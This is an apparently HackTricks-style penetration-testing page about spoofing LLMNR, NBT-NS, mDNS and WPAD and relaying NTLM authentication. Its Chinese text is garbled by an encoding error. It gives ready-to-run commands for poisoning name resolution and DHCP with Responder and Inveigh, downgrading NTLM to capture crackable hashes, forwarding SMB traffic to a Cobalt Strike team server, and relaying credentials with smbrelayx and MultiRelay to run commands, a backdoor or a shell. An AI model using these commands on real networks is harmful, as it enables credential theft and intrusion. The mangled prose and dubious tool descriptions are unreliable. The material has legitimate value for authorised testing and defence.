# ä¼ªé€ LLMNRã€NBT-NSã€mDNS/DNSå’ŒWPADä»¥åŠä¸­ç»§æ”»å‡»

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ YouTube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTs](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## ç½‘ç»œåè®®

### LLMNRã€NBT-NSå’ŒmDNS

Microsoftç³»ç»Ÿåœ¨DNSæŸ¥æ‰¾å¤±è´¥æ—¶ä½¿ç”¨é“¾è·¯æœ¬åœ°ç»„æ’­åç§°è§£æï¼ˆLLMNRï¼‰å’ŒNetBIOSåç§°æœåŠ¡ï¼ˆNBT-NSï¼‰è¿›è¡Œæœ¬åœ°ä¸»æœºè§£æã€‚Apple Bonjourå’ŒLinuxé›¶é…ç½®å®ç°ä½¿ç”¨å¤šæ’­DNSï¼ˆmDNSï¼‰æ¥å‘ç°ç½‘ç»œä¸­çš„ç³»ç»Ÿã€‚è¿™äº›åè®®æ˜¯æœªç»èº«ä»½éªŒè¯çš„ï¼Œå¹¶é€šè¿‡UDPå¹¿æ’­æ¶ˆæ¯ï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥åˆ©ç”¨å®ƒä»¬å°†ç”¨æˆ·å¼•å¯¼åˆ°æ¶æ„æœåŠ¡ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨Responderæ¥ä¼ªé€ è¢«ä¸»æœºæœç´¢çš„æœåŠ¡ï¼Œå‘é€è™šå‡å“åº”ã€‚\
åœ¨[å¦‚ä½•ä½¿ç”¨Responderä¼ªé€ æœåŠ¡](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)ä¸­é˜…è¯»æ›´å¤šä¿¡æ¯ã€‚

### WPAD

è®¸å¤šæµè§ˆå™¨ä½¿ç”¨Webä»£ç†è‡ªåŠ¨å‘ç°ï¼ˆWPADï¼‰ä»ç½‘ç»œåŠ è½½ä»£ç†è®¾ç½®ã€‚WPADæœåŠ¡å™¨é€šè¿‡ç‰¹å®šçš„URLï¼ˆä¾‹å¦‚_http://wpad.example.org/wpad.dat_ï¼‰æä¾›å®¢æˆ·ç«¯ä»£ç†è®¾ç½®ï¼Œé€šè¿‡ä»¥ä¸‹ä»»ä¸€æ–¹å¼è¯†åˆ«ï¼š

* DHCPï¼Œä½¿ç”¨ä»£ç 252æ¡ç›®[34](https://learning.oreilly.com/library/view/Network+Security+Assessment,+3rd+Edition/9781491911044/ch05.html#ch05fn41)
* DNSï¼Œåœ¨æœ¬åœ°åŸŸä¸­æœç´¢_wpad_ä¸»æœºå
* Microsoft LLMNRå’ŒNBT-NSï¼ˆåœ¨DNSæŸ¥æ‰¾å¤±è´¥çš„æƒ…å†µä¸‹ï¼‰

Responderè‡ªåŠ¨åŒ–äº†WPADæ”»å‡»-è¿è¡Œä»£ç†å¹¶é€šè¿‡DHCPã€DNSã€LLMNRå’ŒNBT-NSå°†å®¢æˆ·ç«¯å¼•å¯¼åˆ°æ¶æ„WPADæœåŠ¡å™¨ã€‚

## åè®®ä¸­æ¯’

### Responder - LLMNRã€NBT-NSå’ŒMDNS

> Responderæ˜¯ä¸€ä¸ªLLMNRã€NBT-NSå’ŒMDNSæ¯’åŒ–å·¥å…·ã€‚å®ƒå°†æ ¹æ®åç§°åç¼€ï¼ˆå‚è§ï¼š[http://support.microsoft.com/kb/163409](http://support.microsoft.com/kb/163409)ï¼‰å›ç­”ç‰¹å®šçš„NBT-NSï¼ˆNetBIOSåç§°æœåŠ¡ï¼‰æŸ¥è¯¢ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œè¯¥å·¥å…·åªä¼šå›ç­”SMBçš„æ–‡ä»¶æœåŠ¡å™¨æœåŠ¡è¯·æ±‚ã€‚
>
> è¿™ä¸ªæ¦‚å¿µæ˜¯é’ˆå¯¹æˆ‘ä»¬çš„ç­”æ¡ˆè¿›è¡Œå®šä½ï¼Œä½¿æˆ‘ä»¬åœ¨ç½‘ç»œä¸Šæ›´éšè”½ã€‚è¿™ä¹Ÿæœ‰åŠ©äºç¡®ä¿æˆ‘ä»¬ä¸ä¼šç ´ååˆæ³•çš„NBT-NSè¡Œä¸ºã€‚

* [**Responder**](https://github.com/lgandx/Responder)åœ¨kaliä¸­é»˜è®¤å®‰è£…ï¼Œé…ç½®æ–‡ä»¶ä½äº\*\*`/etc/responder/Responder.conf` \*\*ï¼ˆåœ¨è¿™é‡Œå¯ä»¥ç¦ç”¨æ¶æ„æœåŠ¡å™¨ï¼‰
* **Responder**å°†**åœ¨å±å¹•ä¸Šæ‰“å°å“ˆå¸Œå€¼**å¹¶å°†å…¶å†™å…¥ä½äº`/usr/share/responder/logs`ç›®å½•ä¸‹çš„æ¯ä¸ªä¸»æœºçš„æ—¥å¿—æ–‡ä»¶ä¸­ã€‚å“ˆå¸Œå€¼ä»¥`(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt`çš„æ ¼å¼ä¿å­˜
* æ‚¨å¯ä»¥åœ¨[è¿™é‡Œ](https://github.com/lgandx/Responder-Windows)æ‰¾åˆ°**Windows**çš„Responder
* Responderé€‚ç”¨äº**ipv4**å’Œ**ipv6**

#### Responderå‚æ•°

Responderæ”¯æŒä»¥ä¸‹é€‰é¡¹ï¼š
```
--version           show program's version number and exit
-h, --help          show this help message and exit
-A, --analyze       Analyze mode. This option allows you to see NBT-NS,
BROWSER, LLMNR requests without responding.
-I eth0, --interface=eth0
Network interface to use, you can use 'ALL' as a
wildcard for all interfaces
-i 10.0.0.21, --ip=10.0.0.21
Local IP to use (only for OSX)
-6 2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed, --externalip6=2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed
Poison all requests with another IPv6 address than
Responder's one.
-e 10.0.0.22, --externalip=10.0.0.22
Poison all requests with another IP address than
Responder's one.
-b, --basic         Return a Basic HTTP authentication. Default: NTLM
-r, --wredir        Enable answers for netbios wredir suffix queries.
Answering to wredir will likely break stuff on the
network. Default: False
-d, --DHCP          Enable answers for DHCP broadcast requests. This
option will inject a WPAD server in the DHCP response.
Default: False
-D, --DHCP-DNS      This option will inject a DNS server in the DHCP
response, otherwise a WPAD server will be added.
Default: False
-w, --wpad          Start the WPAD rogue proxy server. Default value is
False
-u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
Upstream HTTP proxy used by the rogue WPAD Proxy for
outgoing requests (format: host:port)
-F, --ForceWpadAuth Force NTLM/Basic authentication on wpad.dat file
retrieval. This may cause a login prompt. Default:
False
-P, --ProxyAuth     Force NTLM (transparently)/Basic (prompt)
authentication for the proxy. WPAD doesn't need to be
ON. This option is highly effective when combined with
-r. Default: False
--lm                Force LM hashing downgrade for Windows XP/2003 and
earlier. Default: False
--disable-ess       Force ESS downgrade. Default: False
-v, --verbose       Increase verbosity.
```
<details>

<summary>Responderå‚æ•°</summary>

* `-A`æ ‡å¿—å°†æˆ‘ä»¬ç½®äº**åˆ†ææ¨¡å¼**ï¼Œå…è®¸æˆ‘ä»¬åœ¨ä¸æ±¡æŸ“ä»»ä½•å“åº”çš„æƒ…å†µä¸‹æŸ¥çœ‹ç¯å¢ƒä¸­çš„NBT-NSã€BROWSERå’ŒLLMNRè¯·æ±‚ã€‚
* æˆ‘ä»¬å¿…é¡»å§‹ç»ˆæä¾›æ¥å£æˆ–IPã€‚
* `-wf`å°†å¯åŠ¨WPADæ¶æ„ä»£ç†æœåŠ¡å™¨ã€‚
* `-f`å°†å°è¯•æŒ‡çº¹è¯†åˆ«è¿œç¨‹ä¸»æœºçš„æ“ä½œç³»ç»Ÿå’Œç‰ˆæœ¬ã€‚
* ä½¿ç”¨`-v`æ ‡å¿—å¯ä»¥å¢åŠ è¯¦ç»†ç¨‹åº¦ï¼ˆåœ¨æ§åˆ¶å°æ‰“å°å¤§é‡é™„åŠ æ•°æ®ï¼‰ã€‚
* `-F`å’Œ`-P`ç­‰é€‰é¡¹å¯ç”¨äºå¼ºåˆ¶NTLMæˆ–åŸºæœ¬èº«ä»½éªŒè¯å’Œå¼ºåˆ¶ä»£ç†èº«ä»½éªŒè¯ï¼Œä½†å¯èƒ½ä¼šå¯¼è‡´ç™»å½•æç¤ºï¼Œå› æ­¤åº”è°¨æ…ä½¿ç”¨ã€‚
* `-w`æ ‡å¿—ä½¿ç”¨å†…ç½®çš„WPADä»£ç†æœåŠ¡å™¨ã€‚è¿™åœ¨å¤§å‹ç»„ç»‡ä¸­ç‰¹åˆ«æœ‰æ•ˆï¼Œå› ä¸ºå®ƒå°†æ•è·å¯åŠ¨Internet Explorerçš„ä»»ä½•ç”¨æˆ·çš„æ‰€æœ‰HTTPè¯·æ±‚ï¼Œå¦‚æœæµè§ˆå™¨å¯ç”¨äº†[è‡ªåŠ¨æ£€æµ‹è®¾ç½®](https://docs.microsoft.com/en-us/internet-explorer/ie11-deploy-guide/auto-detect-settings-for-ie11)ã€‚

</details>

#### è¿è¡ŒResponder

è¦è¿è¡Œé»˜è®¤çš„Responderè¡Œä¸ºï¼Œåªéœ€æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š
```bash
responder -I <Iface> #Default conf
responder -I <Iface> -P -r -v #More chances but might break things
```
ä¸€ç§æœ‰è¶£çš„æŠ€æœ¯æ˜¯ä½¿ç”¨responderåœ¨å¯èƒ½çš„æƒ…å†µä¸‹é™çº§NTLMèº«ä»½éªŒè¯ã€‚è¿™å°†å…è®¸**æ•è·NTLMv1æŒ‘æˆ˜å’Œå“åº”**ï¼Œè€Œä¸æ˜¯å¯ä»¥**è½»æ¾ç ´è§£**çš„NTLMv2 [**æŒ‰ç…§æ­¤æŒ‡å—**](../../windows-hardening/ntlm/#ntlmv1-attack)**ã€‚**
```bash
#Remember that in order to crack NTLMv1 you need to set Responder challenge to "1122334455667788"
responder -I <Iface> --lm --disable-ess #Downgrade NTLM authntication if possible and force ESS downgrade
```
é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸ä¼šæ‰§è¡ŒWPADå†’å……æ”»å‡»ï¼Œä½†ä½ å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æ‰§è¡Œï¼š
```bash
responder -I <Iface> --wpad
```
æ‚¨è¿˜å¯ä»¥ä½¿ç”¨æ‚¨çš„IPåœ°å€æ¥è§£æNetBIOSè¯·æ±‚ã€‚å¹¶åˆ›å»ºä¸€ä¸ªèº«ä»½éªŒè¯ä»£ç†ï¼š
```bash
responder.py -I <interface> -Pv
```
ä½ é€šå¸¸æ— æ³•æ‹¦æˆªNTLMå“ˆå¸Œï¼Œä½†ä½ å¯ä»¥è½»æ¾è·å–ä¸€äº›NTLMæŒ‘æˆ˜å’Œå“åº”ï¼Œç„¶åä½¿ç”¨ä¾‹å¦‚johné€‰é¡¹`--format=netntlmv2`æ¥ç ´è§£ã€‚

åœ¨kaliä¸­ï¼Œé»˜è®¤çš„Responderå®‰è£…çš„æ—¥å¿—å’ŒæŒ‘æˆ˜å¯ä»¥åœ¨`/usr/share/responder/logs`ä¸­æ‰¾åˆ°ã€‚

#### Responder - DHCPä¸­æ¯’

Windowsä½¿ç”¨å‡ ä¸ªè‡ªå®šä¹‰çš„DHCPé€‰é¡¹ï¼Œå¦‚NetBIOSã€WINSã€WPADè®¾ç½®ã€‚å½“å·¥ä½œç«™å‘é€DHCPè¯·æ±‚ä»¥è·å–å…¶ç½‘ç»œè®¾ç½®æ—¶ï¼Œè¿™äº›é™„åŠ è®¾ç½®å¯ä»¥åŒ…å«åœ¨DHCPå“åº”ä¸­ï¼Œä»¥ä¾¿å®ç°ç®€å•çš„è¿æ¥å’Œåç§°è§£æã€‚

æ¬ºéª—DHCPå“åº”è€Œä¸é€ æˆå¹²æ‰°å¯èƒ½æ˜¯å…·æœ‰æŒ‘æˆ˜æ€§çš„ï¼Œå› ä¸ºä½ æ­£åœ¨å¹²æ‰°å·¥ä½œç«™çš„ç½‘ç»œé…ç½®ã€‚é€šå¸¸ï¼Œä½ éœ€è¦å¯¹ç›®æ ‡å­ç½‘æœ‰å¾ˆå¥½çš„äº†è§£ï¼ŒåŒ…æ‹¬DNSæœåŠ¡å™¨çš„ä½ç½®ã€äº¤æ¢æœºçš„ä½ç½®ã€è·¯ç”±è¡¨ã€åŸŸã€å­ç½‘æ©ç ã€DHCPæœåŠ¡å™¨ç­‰ç­‰ã€‚ä»»ä½•è¿™äº›è®¾ç½®çš„é”™è¯¯éƒ½ä¼šå¯¼è‡´ç½‘ç»œä¸­æ–­ã€‚

ç„¶è€Œï¼Œæ¬ºéª—DHCPå“åº”å…·æœ‰ç‹¬ç‰¹çš„å¥½å¤„ã€‚å®ƒç»å¯¹æ¯”ARPä¸­æ¯’æ›´éšè”½ï¼›ä¸€ä¸ªå•æ’­å“åº”è¶³ä»¥æ°¸ä¹…ä¸­æ¯’å—å®³è€…çš„è·¯ç”±ä¿¡æ¯ï¼Œè€Œä¸”åœ¨ä¸€ä¸ªç½‘ç»œä¸Šé€šå¸¸ä¼šçœ‹åˆ°å¤šä¸ªDHCPæœåŠ¡å™¨è¿è¡Œã€‚å•æ’­DHCPå“åº”æ›´éš¾æ£€æµ‹ï¼Œä¸€äº›äº¤æ¢æœºæä¾›å®‰å…¨è®¾ç½®ä»¥é˜²æ­¢DHCPç›‘å¬ï¼Œç„¶è€Œè¿™äº›è®¾ç½®å¹¶ä¸ç›´è§‚ï¼Œå½“å¯ç”¨æ—¶ç»å¸¸é…ç½®é”™è¯¯ã€‚

> è¿™ç§æ”»å‡»éå¸¸æœ‰æ•ˆï¼Œå¹¶ä¸”å¯ä»¥è·å¾—ç¡®ä¿çš„NTLMv1/2å“ˆå¸Œã€‚
```bash
./Responder.py -I eth0 -Pdv
```
#### Responder - æ•è·å‡­è¯

Responderå°†**å†’å……ä½¿ç”¨æ‰€æåˆ°çš„åè®®çš„æ‰€æœ‰æœåŠ¡**ã€‚ä¸€æ—¦æŸä¸ªç”¨æˆ·å°è¯•è®¿é—®ä½¿ç”¨è¿™äº›åè®®è§£æçš„æœåŠ¡ï¼Œ**ä»–å°†å°è¯•å¯¹Responderè¿›è¡Œèº«ä»½éªŒè¯**ï¼Œå¹¶ä¸”Responderå°†èƒ½å¤Ÿ**æ•è·**â€œå‡­è¯â€ï¼ˆå¾ˆå¯èƒ½æ˜¯**NTLMv2 Challenge/Response**ï¼‰ï¼š

å¯ä»¥å°è¯•é™çº§åˆ°NetNTLMv1æˆ–å°è¯•ç¦ç”¨ESSã€‚

![](<../../.gitbook/assets/poison (1) (1) (1).jpg>)

### Inveigh - C#/PowerShell Responder

> Inveighæ˜¯ä¸€ä¸ªPowerShell ADIDNS/LLMNR/NBNS/mDNS/DNSæ¬ºéª—å’Œä¸­é—´äººå·¥å…·ï¼Œæ—¨åœ¨å¸®åŠ©å—é™äºWindowsç³»ç»Ÿçš„æ¸—é€æµ‹è¯•äººå‘˜/çº¢é˜Ÿäººå‘˜ã€‚

[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh)æ˜¯ä¸€ä¸ªPowerShellè„šæœ¬ï¼Œç°åœ¨æ˜¯ä¸€ä¸ªå…·æœ‰ä¸Responderç›¸åŒä¸»è¦åŠŸèƒ½çš„C#äºŒè¿›åˆ¶æ–‡ä»¶ã€‚æœ‰ä¸€ä¸ª[**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters)åˆ—å‡ºäº†æ‰€æœ‰å‚æ•°å’Œä½¿ç”¨è¯´æ˜ã€‚\
è¿˜å¯ä»¥åœ¨[**InveighZero**](https://github.com/Kevin-Robertson/InveighZero)ä¸­æ‰¾åˆ°å¦ä¸€ä¸ªç‰ˆæœ¬ã€‚

![](../../.gitbook/assets/45662029-1b5e6300-bace-11e8-8180-32f8d377d48b.png)

æˆ–è€…ä½¿ç”¨æ›´å¤šé€‰é¡¹è¿è¡Œå®ƒï¼š
```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
æˆ–è€…è¿è¡ŒC#ç‰ˆæœ¬ï¼š
```bash
Inveigh.exe
```
## NTLMä¸­ç»§æ”»å‡»

è¿™ç§æ”»å‡»å°†å†…éƒ¨ç½‘ç»œä¸Šçš„**SMBèº«ä»½éªŒè¯ä¼šè¯**ä¸­ç»§åˆ°ä¸€ä¸ª**ç›®æ ‡æœºå™¨**ã€‚å¦‚æœèº«ä»½éªŒè¯**ä¼šè¯æˆåŠŸ**ï¼Œå®ƒå°†è‡ªåŠ¨å°†æ‚¨ç½®äºä¸€ä¸ª**ç³»ç»Ÿ**çš„**shell**ä¸­ã€‚è¯·æ³¨æ„ï¼Œä¸­ç»§çš„èº«ä»½éªŒè¯å¿…é¡»æ¥è‡ªä¸€ä¸ª**å…·æœ‰å¯¹ä¸­ç»§ä¸»æœºçš„æœ¬åœ°ç®¡ç†å‘˜è®¿é—®æƒé™çš„ç”¨æˆ·**ï¼Œå¹¶ä¸”**å¿…é¡»ç¦ç”¨SMBç­¾å**ã€‚

### 445ç«¯å£è½¬å‘å’Œéš§é“

{% hint style="warning" %}
å¦‚æœæ‚¨å¯ä»¥**åœ¨ç½‘ç»œå†…å¼•å…¥ä¸€å°æœºå™¨**ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ä»¥ä¸‹éƒ¨åˆ†ä¸­çš„ä»»ä½•**å·¥å…·**æ¥æ‰§è¡Œä¸­ç»§æ”»å‡»ï¼Œæ‚¨ä¸éœ€è¦å…³å¿ƒè¿™ä¸ªã€‚
{% endhint %}

ç„¶è€Œï¼Œåœ¨çº¢é˜Ÿä¸­ï¼Œæƒ…å†µå¹¶éå¦‚æ­¤ï¼Œé€šå¸¸æ‚¨éœ€è¦**å°†Windowsæœºå™¨çš„445ç«¯å£çš„æµé‡è½¬å‘åˆ°æ‚¨çš„æœºå™¨**ï¼Œå¹¶æ‰§è¡Œä»¥ä¸‹ä»»ä½•å·¥å…·ä¹‹ä¸€ï¼Œç„¶å**é€šè¿‡ä»£ç†å°†è¯¥å·¥å…·çš„æµé‡è·¯ç”±å›æ¥**ï¼Œä»¥è¾¾åˆ°æ”»å‡»å†…éƒ¨æœºå™¨çš„ç›®çš„ã€‚

å·¥å…·[**PortBender**](https://github.com/praetorian-inc/PortBender)æ˜¯ä¸€ä¸ªé©±åŠ¨ç¨‹åºï¼Œç”¨äºå°†ç›®æ ‡ç«¯å£**445çš„æµé‡é‡å®šå‘åˆ°å¦ä¸€ä¸ªç«¯å£**ï¼ˆä¾‹å¦‚8445ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥**ç»‘å®š**è¯¥ç«¯å£ã€‚ä¸ºäº†åŠ è½½é©±åŠ¨ç¨‹åºï¼Œå®ƒéœ€è¦**æœ¬åœ°ç®¡ç†å‘˜è®¿é—®æƒé™**ã€‚ä½¿ç”¨`cd C:\Windows\System32\drivers`æ˜¯æœ‰é“ç†çš„ï¼Œå› ä¸ºè¿™æ˜¯å¤§å¤šæ•°Windowsé©±åŠ¨ç¨‹åºçš„ä½ç½®ã€‚
```bash
Cobalt Strike -> Script Manager -> Load (Select from the filesystem PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Go to drivers dir
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Forward traffic to 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Send traffic to port 8445 to Team Server
beacon> socks 1080 # Socks proxy in port 1080 to attack host in the internal network from the Team Server

# To kill
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Metasploit

Metasploitæ˜¯ä¸€æ¬¾å¹¿æ³›ä½¿ç”¨çš„æ¸—é€æµ‹è¯•å·¥å…·ï¼Œå®ƒæä¾›äº†ä¸€ç³»åˆ—å¼ºå¤§çš„åŠŸèƒ½å’Œæ¨¡å—ï¼Œç”¨äºå‘ç°å’Œåˆ©ç”¨ç³»ç»Ÿä¸­çš„æ¼æ´ã€‚Metasploitå¯ä»¥å¸®åŠ©æ¸—é€æµ‹è¯•äººå‘˜è¯„ä¼°ç›®æ ‡ç³»ç»Ÿçš„å®‰å…¨æ€§ï¼Œå¹¶æä¾›äº†è‡ªåŠ¨åŒ–çš„æ¼æ´åˆ©ç”¨å’Œæ¸—é€æµ‹è¯•è¿‡ç¨‹ã€‚

Metasploitçš„ä¸»è¦ç‰¹ç‚¹åŒ…æ‹¬ï¼š

- æ¨¡å—åŒ–æ¶æ„ï¼šMetasploitä½¿ç”¨æ¨¡å—åŒ–çš„æ¶æ„ï¼Œä½¿ç”¨æˆ·å¯ä»¥æ ¹æ®éœ€è¦é€‰æ‹©å’Œç»„åˆä¸åŒçš„æ¨¡å—ï¼Œä»¥å®ç°ç‰¹å®šçš„æ”»å‡»å’Œæ¸—é€æµ‹è¯•ç›®æ ‡ã€‚
- æ¼æ´åˆ©ç”¨ï¼šMetasploitæä¾›äº†å¤§é‡çš„æ¼æ´åˆ©ç”¨æ¨¡å—ï¼Œç”¨äºå‘ç°å’Œåˆ©ç”¨ç³»ç»Ÿä¸­çš„å·²çŸ¥æ¼æ´ã€‚è¿™äº›æ¨¡å—å¯ä»¥è‡ªåŠ¨åŒ–æ‰§è¡Œæ¼æ´åˆ©ç”¨è¿‡ç¨‹ï¼Œä»è€Œç®€åŒ–æ¸—é€æµ‹è¯•çš„æµç¨‹ã€‚
- ç¤¾åŒºé©±åŠ¨ï¼šMetasploitæ˜¯ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼Œæ‹¥æœ‰åºå¤§çš„ç¤¾åŒºæ”¯æŒã€‚è¿™æ„å‘³ç€ç”¨æˆ·å¯ä»¥ä»ç¤¾åŒºä¸­è·å–æ–°çš„æ¨¡å—å’Œæ¼æ´åˆ©ç”¨æŠ€æœ¯ï¼Œå¹¶ä¸å…¶ä»–æ¸—é€æµ‹è¯•äººå‘˜åˆ†äº«ç»éªŒå’ŒçŸ¥è¯†ã€‚
- å¤šå¹³å°æ”¯æŒï¼šMetasploitå¯ä»¥åœ¨å¤šä¸ªæ“ä½œç³»ç»Ÿä¸Šè¿è¡Œï¼ŒåŒ…æ‹¬Windowsã€Linuxå’ŒMac OS Xã€‚è¿™ä½¿å¾—ç”¨æˆ·å¯ä»¥åœ¨ä¸åŒçš„ç¯å¢ƒä¸­ä½¿ç”¨Metasploitè¿›è¡Œæ¸—é€æµ‹è¯•ã€‚
- å‘½ä»¤è¡Œå’Œå›¾å½¢ç•Œé¢ï¼šMetasploitæä¾›äº†å‘½ä»¤è¡Œå’Œå›¾å½¢ç•Œé¢ä¸¤ç§æ–¹å¼è¿›è¡Œæ“ä½œã€‚ç”¨æˆ·å¯ä»¥æ ¹æ®è‡ªå·±çš„å–œå¥½é€‰æ‹©é€‚åˆè‡ªå·±çš„ç•Œé¢ã€‚

æ€»ä¹‹ï¼ŒMetasploitæ˜¯ä¸€æ¬¾åŠŸèƒ½å¼ºå¤§çš„æ¸—é€æµ‹è¯•å·¥å…·ï¼Œå¯ä»¥å¸®åŠ©æ¸—é€æµ‹è¯•äººå‘˜å‘ç°å’Œåˆ©ç”¨ç³»ç»Ÿä¸­çš„æ¼æ´ï¼Œè¯„ä¼°ç›®æ ‡ç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚å®ƒçš„æ¨¡å—åŒ–æ¶æ„å’Œç¤¾åŒºæ”¯æŒä½¿å…¶æˆä¸ºæ¸—é€æµ‹è¯•äººå‘˜çš„é¦–é€‰å·¥å…·ä¹‹ä¸€ã€‚
```bash
setg Proxies socks4:127.0.0.1:1080 # Use this if you need to route the traffic to reach the attacked ip
set SRVHOST <local_ip>
set SRVPORT 445
set SMBHOST <ip_to_auth_to>
run -j
```
### smbrelayx

smbrelayxæ˜¯ä¸€ä¸ªå·¥å…·ï¼Œç”¨äºæ‰§è¡ŒSMBä¸­ç»§æ”»å‡»ã€‚è¯¥æ”»å‡»åˆ©ç”¨äº†SMBåè®®ä¸­çš„æ¼æ´ï¼Œé€šè¿‡æ¬ºéª—ç›®æ ‡ç³»ç»Ÿï¼Œä½¿å…¶å°†èº«ä»½éªŒè¯è¯·æ±‚å‘é€åˆ°æ”»å‡»è€…æ§åˆ¶çš„ä¸­ç»§æœåŠ¡å™¨ä¸Šã€‚è¿™ä½¿å¾—æ”»å‡»è€…èƒ½å¤Ÿè·å–ç›®æ ‡ç³»ç»Ÿçš„å‡­æ®ï¼Œå¹¶è¿›ä¸€æ­¥å…¥ä¾µç½‘ç»œã€‚

ä½¿ç”¨smbrelayxï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ç›®æ ‡ç½‘ç»œä¸­æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š

1. **ä¸­ç»§æ”»å‡»**ï¼šæ”»å‡»è€…å¯ä»¥ä¸­ç»§ç›®æ ‡ç³»ç»Ÿä¸å…¶ä»–ç³»ç»Ÿä¹‹é—´çš„SMBæµé‡ï¼Œä»è€Œè·å–ç›®æ ‡ç³»ç»Ÿçš„å‡­æ®ã€‚

2. **NTLMæ•£åˆ—æ³¨å…¥**ï¼šæ”»å‡»è€…å¯ä»¥æ³¨å…¥æ¶æ„çš„NTLMæ•£åˆ—ï¼Œä»¥è·å–ç›®æ ‡ç³»ç»Ÿçš„å‡­æ®ã€‚

3. **SMBä¼šè¯åŠ«æŒ**ï¼šæ”»å‡»è€…å¯ä»¥åŠ«æŒç›®æ ‡ç³»ç»Ÿçš„SMBä¼šè¯ï¼Œè·å–ç›®æ ‡ç³»ç»Ÿçš„å‡­æ®ã€‚

smbrelayxæ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„å·¥å…·ï¼Œä½†éœ€è¦è°¨æ…ä½¿ç”¨ã€‚æ”»å‡»è€…åº”è¯¥åœ¨åˆæ³•æˆæƒçš„èŒƒå›´å†…ä½¿ç”¨è¯¥å·¥å…·ï¼Œå¹¶éµå®ˆæ³•å¾‹å’Œé“å¾·è§„èŒƒã€‚
```bash
python3 smbrelayx.py -t smb://<ip_to_attack> -smb2support --no-http-server --no-wcf-server
# By default it will just dump hashes
# To execute a command use: -c "ipconfig"
# To execute a backdoor use: -e "/path/to/backdoor

# Attack through socks proxy
proxychains python3 ntlmrelayx.py -t smb://<ip_to_attack> -smb2support --no-http-server --no-wcf-server
```
### MultiRelay

å¦‚æœä½ æƒ³ä½¿ç”¨**MultiRelay**ï¼Œè¯·å‰å¾€_**/usr/share/responder/tools**_å¹¶æ‰§è¡ŒMultiRelay (`-t <ç›®æ ‡IP> -u <ç”¨æˆ·>`)ï¼š
```bash
python MultiRelay.py -t <IP target> -u ALL # If "ALL" then all users are relayed
# By default a shell is returned
python MultiRelay.py -t <IP target> -u ALL -c whoami #-c to execute command
python MultiRelay.py -t <IP target> -u ALL -d #-d to dump hashes

# Use proxychains if you need to route the traffic to reach the attacked ip
```
![](<../../.gitbook/assets/image (209).png>)

### å¼ºåˆ¶ NTLM ç™»å½•

åœ¨ Windows ä¸­ï¼Œæ‚¨**å¯èƒ½èƒ½å¤Ÿå¼ºåˆ¶æŸäº›ç‰¹æƒå¸æˆ·å¯¹ä»»æ„æœºå™¨è¿›è¡Œèº«ä»½éªŒè¯**ã€‚é˜…è¯»ä»¥ä¸‹é¡µé¢ä»¥äº†è§£è¯¦æƒ…ï¼š

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## è§£å†³æ–¹æ¡ˆ

### ç¦ç”¨ LLMNR

